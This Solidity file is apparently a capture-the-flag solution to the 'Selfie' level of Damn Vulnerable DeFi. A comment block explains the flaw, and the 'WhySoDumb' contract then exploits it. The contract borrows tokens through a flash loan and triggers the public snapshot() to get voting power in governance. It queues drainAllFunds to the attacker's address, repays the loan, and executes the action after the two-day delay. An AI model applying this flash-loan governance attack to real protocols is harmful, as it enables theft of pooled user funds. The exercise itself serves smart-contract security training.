// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
The vulnerability is that the same snapshottable tokens that are used in 'SimpleGovernance.sol' is the same as what 'SelfiePool.sol' offers in flash loans, and as SimpleGovernance allows anyone with 51% or more tokens to schedule actions, these 2 can be chained so that anyone can schedule actions.

However, the instantaneous balance of the msg.sender isn't checked while deciding if they have at least 51%. Instead, their snapshotted values are used. But, the 'snapshot()' on 'DamnValuableTokenSnapshot' is public, meaning, we can get our flash loaned tokens snapshotted before completing the loan.

Here's the attack steps:

1. Take flash loan of a lot of DVT tokens
2. In callback:
	a. Call 'snapshot()' on DamnValuableTokenSnapshot
	b. Call 'queueAction()' on SimpleGovernance with arguments to call 'drainAllFunds()' on 'SelfiePool.sol' to transfer all funds to attacker. Make sure to store the action id.
	c. Repay back loan of DVT tokens

Now wait for 2 days, then:
1. Call 'executeAction()' on 'SimpleGovernance' with the stored action id.
 */

contract WhySoDumb {
    SelfiePool selfiePool;
    address attackerAddr;
    uint256 actionIdForHack;

    constructor(address _selfiePoolAddr) {
        selfiePool = SelfiePool(_selfiePoolAddr);
        attackerAddr = msg.sender;
    }

    // Call this function to initiate attack
    function startAttack() external {
        // 1. Take flash loan of a lot of DVT tokens
        DamnValuableTokenSnapshot dvtToken = DamnValuableTokenSnapshot(
            address(selfiePool.token())
        );
        uint256 dvtTokensAmtLoanable = dvtToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(dvtTokensAmtLoanable);
    }

    // Callback for flash loan
    function receiveTokens(address _dvtTokenAddr, uint256 _dvtTokensLoan)
        external
    {
        DamnValuableTokenSnapshot dvtToken = DamnValuableTokenSnapshot(
            _dvtTokenAddr
        );

        // 2. Call 'snapshot()' on DamnValuableTokenSnapshot
        dvtToken.snapshot();

        // 3. Call 'queueAction()' on SimpleGovernance with arguments to call 'drainAllFunds()' on 'SelfiePool.sol' to transfer all funds to attacker. Make sure to store the action id.
        SimpleGovernance simpleGovernance = selfiePool.governance();
        bytes memory functionCallEncoded = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attackerAddr
        );
        actionIdForHack = simpleGovernance.queueAction(
            address(selfiePool),
            functionCallEncoded,
            0
        );

        // 4. Repay back loan of DVT tokens
        dvtToken.transfer(address(selfiePool), _dvtTokensLoan);
    }

    // Call this 2 days after scheduling attack action
    function finishAttack() external {
        // 5. Call 'executeAction()' on 'SimpleGovernance' with the stored action id.
        selfiePool.governance().executeAction(actionIdForHack);
    }
}
